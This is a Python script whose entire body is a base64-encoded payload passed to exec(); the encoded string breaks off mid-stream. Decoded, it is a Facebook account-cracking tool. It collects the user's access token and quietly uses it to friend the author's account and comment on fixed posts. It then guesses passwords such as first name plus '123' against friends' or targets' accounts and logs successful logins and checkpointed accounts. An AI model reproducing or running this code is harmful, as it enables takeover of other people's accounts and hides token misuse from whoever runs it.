import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yDQojY29kaW5nPXV0Zi04DQoNCg0KaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMsbWVjaGFuaXplDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXINCg0KDQpyZWxvYWQoc3lzKQ0Kc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpDQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkNCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQ0KYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpDQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldDQoNCmRlZiBrZWx1YXIoKToNCglwcmludCAiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtRXhpdCINCglvcy5zeXMuZXhpdCgpDQoNCg0KZGVmIGFjYWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGQgPSAnJw0KICAgIGZvciBpIGluIHg6DQogICAgICAgIGQgKz0gJyEnK3dbcmFuZG9tLnJhbmRpbnQoMCxsZW4odyktMSldK2kNCiAgICByZXR1cm4gY2V0YWsoZCkNCg0KDQpkZWYgY2V0YWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGZvciBpIGluIHc6DQogICAgICAgIGogPSB3LmluZGV4KGkpDQogICAgICAgIHg9IHgucmVwbGFjZSgnISVzJyVpLCdcMDMzWyVzOzFtJyVzdHIoMzEraikpDQogICAgeCArPSAnXDAzM1swbScNCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQ0KICAgIHN5cy5zdGRvdXQud3JpdGUoeCsnXG4nKQ0KDQoNCmRlZiBqYWxhbih6KToNCglmb3IgZSBpbiB6ICsgJ1xuJzoNCgkJc3lzLnN0ZG91dC53cml0ZShlKQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJdGltZS5zbGVlcCgwMDAwMC4xKQ0KDQoNCiMjIyMjIExPR08gIyMjIyMNCmxvZ28gPSAiIiINCg0KXDAzM1sxOzMxbSQkJCQkJCRcICAkJFwgICAkJFwgICAgICAgICAgICQkXCAgICAgICANClwwMzNbMTszMW0kJCAgX18kJFwgJCQgfCAgJCQgfCAgICAgICAgICAkJCB8ICAgICAgDQpcMDMzWzE7MzFtJCQgfCAgJCQgfCQkIHwgICQkIHwgJCQkJCQkXCAgJCQgfCAgJCRcIA0KXDAzM1sxOzMxbSQkIHwgICQkIHwkJCQkJCQkJCB8JCQgIF9fJCRcICQkIHwgJCQgIHwNClwwMzNbMTszN20kJCB8ICAkJCB8XF9fX19fJCQgfCQkIHwgIFxfX3wkJCQkJCQgIC8gDQpcMDMzWzE7MzdtJCQgfCAgJCQgfCAgICAgICQkIHwkJCB8ICAgICAgJCQgIF8kJDwgIA0KXDAzM1sxOzM3bSQkJCQkJCQgIHwgICAgICAkJCB8JCQgfCAgICAgICQkIHwgXCQkXCANClwwMzNbMTszN21cX19fX19fXy8gICAgICAgXF9ffFxfX3wgICAgICBcX198ICBcX198DQpcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUF1dGhvciAgIFwwMzNbMTszMW06IFwwMzNbMTszMm1NUi5ERUJPDQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUdpdGh1YiAgIFwwMzNbMTszMW06IFwwMzNbMTszMm1HaXRodWIuY29tL01yRGViby9ENHJrDQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUZhY2Vib29rIFwwMzNbMTszMW06IFwwMzNbMTszMm1GYWNlYm9vay5jb20vTXIuRGViby4wMg0KXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCIiIg0KDQpkZWYgdGlrKCk6DQoJdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICddDQoJZm9yIG8gaW4gdGl0aWs6DQoJCXByaW50KCJcclx4MWJbMTs5M21QbGVhc2UgV2FpdCBceDFiWzE7OTNtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMDAwMDAuMSkNCg0KDQpiYWNrID0gMA0KYmVyaGFzaWwgPSBbXQ0KY2VrcG9pbnQgPSBbXQ0Kb2tzID0gW10NCmlkID0gW10NCmxpc3RncnVwID0gW10NCnZ1bG5vdCA9ICJcMDMzWzMxbU5vdCBWdWxuIg0KdnVsbiA9ICJcMDMzWzMybVZ1bG4iDQoNCm9zLnN5c3RlbSgiY2xlYXIiKQ0KDQpwcmludCAiIiINCg0KXDAzM1sxOzMxbSQkJCQkJCRcICAkJFwgICAkJFwgICAgICAgICAgICQkXCAgICAgICANClwwMzNbMTszMW0kJCAgX18kJFwgJCQgfCAgJCQgfCAgICAgICAgICAkJCB8ICAgICAgDQpcMDMzWzE7MzFtJCQgfCAgJCQgfCQkIHwgICQkIHwgJCQkJCQkXCAgJCQgfCAgJCRcIA0KXDAzM1sxOzMxbSQkIHwgICQkIHwkJCQkJCQkJCB8JCQgIF9fJCRcICQkIHwgJCQgIHwNClwwMzNbMTszN20kJCB8ICAkJCB8XF9fX19fJCQgfCQkIHwgIFxfX3wkJCQkJCQgIC8gDQpcMDMzWzE7MzdtJCQgfCAgJCQgfCAgICAgICQkIHwkJCB8ICAgICAgJCQgIF8kJDwgIA0KXDAzM1sxOzM3bSQkJCQkJCQgIHwgICAgICAkJCB8JCQgfCAgICAgICQkIHwgXCQkXCANClwwMzNbMTszN21cX19fX19fXy8gICAgICAgXF9ffFxfX3wgICAgICBcX198ICBcX198DQpcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUF1dGhvciAgIFwwMzNbMTszMW06IFwwMzNbMTszMm1NUi5ERUJPDQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUdpdGh1YiAgIFwwMzNbMTszMW06IFwwMzNbMTszMm1HaXRodWIuY29tL01yRGViby9ENHJrDQpcMDMzWzE7MzFte1wwMzNbMTszNm14XDAzM1sxOzMxbX0gXDAzM1sxOzMzbUZhY2Vib29rIFwwMzNbMTszMW06IFwwMzNbMTszMm1GYWNlYm9vay5jb20vTXIuRGViby4wMg0KXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCIiIg0KDQpDb3JyZWN0VXNlcm5hbWUgPSAiMTIzIg0KQ29ycmVjdFBhc3N3b3JkID0gIjEyMyINCg0KDQpsb29wID0gJ3RydWUnDQp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOg0KICAgIHVzZXJuYW1lID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtWypdIFwwMzNbMTs5N21Vc2VybmFtZSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIikNCiAgICBpZiAodXNlcm5hbWUgPT0gQ29ycmVjdFVzZXJuYW1lKToNCiAgICAJcGFzc3dvcmQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bKl0gXDAzM1sxOzk3bVBhc3N3b3JkIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iKQ0KICAgICAgICBpZiAocGFzc3dvcmQgPT0gQ29ycmVjdFBhc3N3b3JkKToNCiAgICAgICAgICAgIHByaW50ICJMb2dpbiBTdWNjZXMgIiArIHVzZXJuYW1lDQogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQgIlBhc3N3b3JkIFNhbGFoIg0KCSAgICBwcmludCAiU2lsYWhrYW4gQ2hhdCBBZG1pbiBMZXdhdCBGYWNlYm9vayINCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9Nci5EZWJvLjAyJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAiVXNlcm5hbWUgU2FsYWgiDQoJcHJpbnQgIlNpbGFoa2FuIENhaHQgQWRtaW4gTGV3YXQgRmFjZWJvayINCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL20uZmFjZWJvb2suY29tL01yLkRlYm8uMDInKQ0KDQpkZWYgbG9naW4oKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludCBsb2dvDQogICAgamFsYW4oIlwwMzNbMTs5MW1MT0dJTiBBQ0NFU1MgVE9LRU4gRkFDRUJPT0sgISEhIikNCiAgICBwcmludCANCiAgICB0b2tldCA9IHJhd19pbnB1dCgiXDAzM1sxOzk3bXtcMDMzWzE7OTFtP1wwMzNbMTs5N219IFRva2VuIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQ0KICAgIHRyeToNCiAgICAgICAgb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQ0KICAgICAgICBhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCiAgICAgICAgbmFtYSA9IGFbJ25hbWUnXQ0KICAgICAgICB6ZWRkID0gb3BlbignbG9naW4udHh0JywgJ3cnKQ0KICAgICAgICB6ZWRkLndyaXRlKHRva2V0KQ0KICAgICAgICB6ZWRkLmNsb3NlKCkNCiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N217XDAzM1sxOzkybSFcMDMzWzE7OTdtfVwwMzNbMTs5Mm0gTG9naW4gQmVyaGFzaWwgISAnDQoJamFsYW4gKCdcMDMzWzE7OTNtSmFuZ2FuIEx1cGEgRm9sbG93IEZiIEd1YScpDQoJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vTXIuRGViby4wMicpDQogICAgICAgIGJvdF9rb21lbigpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBwcmludCAiXDAzM1sxOzk3bXtcMDMzWzE7OTFtIVwwMzNbMTs5N219IFwwMzNbMTs5MW1Ub2tlbiBzYWxhaCAhIg0KCXRpbWUuc2xlZXAoMS43KQ0KCWxvZ2luKCkNCiAgICAgICAgDQpkZWYgYm90X2tvbWVuKCk6DQogICAgdHJ5Og0KICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpDQogICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgIHByaW50ICdceDFiWzA7MzltWyFdIFRva2VuIGludmFsaWQnDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoNCiAgICB1bmEgPSAnMTAwMDI0NTQwMjg3MzU0Jw0KICAgIGtvbSA9ICdIYWxvIEJhbmcgRGVib/CfmIEnDQogICAgcmVhYyA9ICdBTkdSWScNCiAgICBwb3N0ID0gJzEwNTA0MTg3MzIwODgwNjknDQogICAgcG9zdDIgPSAnMTA1MDQxODczMjA4ODA2OScNCiAgICBrb20yID0gICdHYW50ZW5nIEJhbmfwn6SjJw0KICAgIHJlYWMyID0gJ0xPVkUnDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9tZXRob2Q9cG9zdCZ1aWRzPScgKyB1bmEgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QgKyAnL2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20gKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QgKyAnL3JlYWN0aW9ucz90eXBlPScgKyByZWFjICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQ0KICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBwb3N0MiArICcvY29tbWVudHMvP21lc3NhZ2U9JyArIGtvbTIgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QyICsgJy9yZWFjdGlvbnM/dHlwZT0nICsgcmVhYzIgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpDQogICAgbWVudSgpDQogICAgICAgIA0KCQ0KZGVmIG1lbnUoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IlwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbVRva2VuIGludmFsaWQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCW5hbWEgPSBhWyduYW1lJ10NCgkJaWQgPSBhWydpZCddDQoJZXhjZXB0IEtleUVycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQiXDAzM1sxOzk2bVshXSBcMDMzWzE7OTFtSXQgc2VlbXMgdGhhdCB5b3VyIGFjY291bnQgaGFzIGEgY2hlY2twb2ludCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1UaGVyZSBpcyBubyBpbnRlcm5ldCBjb25uZWN0aW9uIg0KCQlrZWx1YXIoKQ0KCQlwZXJiYXJ1aSgpDQoNCglvcy5zeXN0ZW0oImNsZWFyIikNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTszN217XDAzM1sxOzM2beKAolwwMzNbMTszN219XDAzM1sxOzM1bSBOYW1hIEFrdW5cMDMzWzE7MzNtICAgICA6XDAzM1sxOzM2bSAiK25hbWENCglwcmludCAiXDAzM1sxOzM3bXtcMDMzWzE7MzZt4oCiXDAzM1sxOzM3bX1cMDMzWzE7MzVtIFVzZXIgSURcMDMzWzE7MzNtICAgICAgIDpcMDMzWzE7MzZtICIraWQNCglwcmludCAiXDAzM1sxOzM3bXtcMDMzWzE7MzZt4oCiXDAzM1sxOzM3bX1cMDMzWzE7MzVtIFRhbmdnYWwgTGFoaXJcMDMzWzE7MzNtIDpcMDMzWzE7MzZtICIrIGFbJ2JpcnRoZGF5J10NCglwcmludCAiXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCINCglwcmludCAiXDAzM1sxOzM3bXtcMDMzWzE7MzNtMDFcMDMzWzE7MzdtfVwwMzNbMTszN21cMDMzWzE7MzdtIFN0YXJ0IENyYWNraW5nIg0KCXByaW50ICJcMDMzWzE7Mzdte1wwMzNbMTszMW0wMFwwMzNbMTszN219XDAzM1sxOzM3bVwwMzNbMTszN20gTG9nb3V0Ig0KCXByaW50ICJcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAIg0KCXBpbGloKCkNCg0KDQpkZWYgcGlsaWgoKToNCgl1bmlrZXJzID0gcmF3X2lucHV0KCJcMDMzWzE7MzNtUGlsaWggXDAzM1sxOzMxbTpcMDMzWzE7MzdtICIpDQoJaWYgdW5pa2VycyA9PSIiOg0KCQlwcmludCAiXDAzM1sxOzk3bXtcMDMzWzE7OTFtIVwwMzNbMTs5N219XDAzM1sxOzk3bSBJc2kgWWcgQmVuYXIgU2F5YW5nICEiDQoJCXBpbGloKCkNCgllbGlmIHVuaWtlcnMgPT0iMSI6DQoJCXN1cGVyKCkNCgllbGlmIHVuaWtlcnMgPT0iMCI6DQoJCWphbGFuKCdUb2tlbiBSZW1vdmVkJykNCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJa2VsdWFyKCkNCgllbHNlOg0KCQlwcmludCAiXDAzM1sxOzk3bXtcMDMzWzE7OTFtIVwwMzNbMTs5N219XDAzM1sxOzk3bSBJc2kgWWcgQmVuYXIgU2F5YW5nICEiDQoJCXBpbGloKCkNCg0KDQpkZWYgc3VwZXIoKToNCglnbG9iYWwgdG9rZXQNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtVG9rZW4gaW52YWxpZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7Mzdte1wwMzNbMTszM20wMVwwMzNbMTszN219XDAzM1sxOzM3bVwwMzNbMTszN20gQ3JhY2sgSUQgRGFyaSBEYWZ0YXIgVGVtYW4iDQoJcHJpbnQgIlwwMzNbMTszN217XDAzM1sxOzMzbTAyXDAzM1sxOzM3bX1cMDMzWzE7MzdtXDAzM1sxOzM3bSBDcmFjayBJRCBQdWJsaWsiDQoJcHJpbnQgIlwwMzNbMTszN217XDAzM1sxOzMzbTAzXDAzM1sxOzM3bX1cMDMzWzE7MzdtXDAzM1sxOzM3bSBDcmFjayBBa3VuIFRhcmdldCINCglwcmludCAiXDAzM1sxOzM3bXtcMDMzWzE7MzFtMDBcMDMzWzE7MzdtfVwwMzNbMTszN21cMDMzWzE7MzdtIEtlbWJhbGkiDQoJcHJpbnQgIlwwMzNbMTszNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAiDQoJcGlsaWhfc3VwZXIoKQ0KDQpkZWYgcGlsaWhfc3VwZXIoKToNCglwZWFrID0gcmF3X2lucHV0KCJcMDMzWzE7MzNtUGlsaWggXDAzM1sxOzMxbTpcMDMzWzE7MzdtICIpDQoJaWYgcGVhayA9PSIiOg0KCQlwcmludCAiXDAzM1sxOzk3bXtcMDMzWzE7OTFtIVwwMzNbMTs5N219XDAzM1sxOzk3bSBJc2kgWWcgQmVuYXIgU2F5YW5nICEiDQoJCXBpbGloX3N1cGVyKCkNCgllbGlmIHBlYWsgPT0iMSI6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCXByaW50DQoJCWphbGFuKCdcMDMzWzE7OTdte1wwMzNbMTszNm3Dl1wwMzNbMTszN219IFwwMzNbMTs5M21HZXR0aW5nIElEIFwwMzNbMTs5N20uLi4nKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQ0KCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCWZvciBzIGluIHpbJ2RhdGEnXToNCgkJCWlkLmFwcGVuZChzWydpZCddKQ0KCWVsaWYgcGVhayA9PSIyIjoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJcHJpbnQgDQoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzM3bXtcMDMzWzE7MzZtw5dcMDMzWzE7MzdtfSBcMDMzWzE7OTNtRW50ZXIgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpDQoJCXRyeToNCgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkNCgkJCW9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkNCgkJCXByaW50IlwwMzNbMTs5Nm17w5d9IE5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1JRCBOb3QgRm91bmQhIg0KCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUJhY2tcMDMzWzE7OTZtXSIpDQoJCQlzdXBlcigpDQoJCWphbGFuKCdcMDMzWzE7OTZte8OXfSBcMDMzWzE7OTNtR2V0dGluZyBJRCBcMDMzWzE7OTdtLi4uJykNCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIi9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQ0KCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCWZvciBpIGluIHpbJ2RhdGEnXToNCgkJCWlkLmFwcGVuZChpWydpZCddKQ0KCWVsaWYgcGVhayA9PSIzIjoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJYnJ1dGUoKQkNCgllbGlmIHBlYWsgPT0iMCI6DQoJCW1lbnUoKQ0KCWVsc2U6DQoJCXByaW50ICJcMDMzWzE7OTZte8OXfSBceDFiWzE7OTFtRmlsbCBpbiBjb3JyZWN0bHkiDQoJCXBpbGloX3N1cGVyKCkNCgkNCglwcmludCAiXDAzM1sxOzM3bXtcMDMzWzE7MzZtw5dcMDMzWzE7OTdtfSBcMDMzWzE7MzdtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihpZCkpDQoJamFsYW4oJ1wwMzNbMTszN217XDAzM1sxOzM2bcOXXDAzM1sxOzk3bX0gXDAzM1sxOzM3bVN0YXJ0aW5nIFwwMzNbMTs5N20uLi4nKQ0KCXRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnXQ0KCWZvciBvIGluIHRpdGlrOg0KCQlwcmludCgiXHJcMDMzWzE7OTZte9d9IFwwMzNbMTs5M21DcmFja2luZyBcMDMzWzE7OTdtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCglqYWxhbigiXG5DcmFjayBTZWRhbmcgQmVyamFsYW4uLi4iICkNCglwcmludCAiXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCINCglwcmludA0KCWRlZiBtYWluKGFyZyk6DQoJCWdsb2JhbCBjZWtwb2ludCxva3MNCgkJdXNlciA9IGFyZw0KCQl0cnk6DQoJCQlvcy5ta2Rpcignb3V0JykNCgkJZXhjZXB0IE9TRXJyb3I6DQoJCQlwYXNzDQoJCXRyeToNCgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJCWIgPSBqc29uLmxvYWRzKGEudGV4dCkNCgkJCXBhc3MxID0gYlsnZmlyc3RfbmFtZSddKycxMjMnDQoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KICAgICANCgkJCQlwcmludCAnXHgxYlsxOzk2bVtceDFiWzE7OTJtSGFjayBTdWNjZXNzZnVsIFx4MWJbMTs1OG1dXHgxYlsxOzk3bSAnICsgdXNlciArICcgXHgxYlsxOzk2bXxceDFiWzE7OTdtICcgKyBwYXNzMQ0KCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMSkNCgkJCWVsc2U6DQoJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KICAgDQoJCQkJCXByaW50J3vDl30nICsgdXNlciArICcgXHgxYlsxOzk2bXxceDFiWzE7OTdtICcgKyBwYXNzMQ0KCQkJCQljZWsgPSBvcGVuKCJvdXQvY2hlY2twb2ludC50eHQiLCAiYSIpDQoJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMSsiXG4iKQ0KCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMSkNCgkJCQllbHNlOg0KCQkJCQlwYXNzMiA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzNCcNCgkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQogICAgICAgDQoJ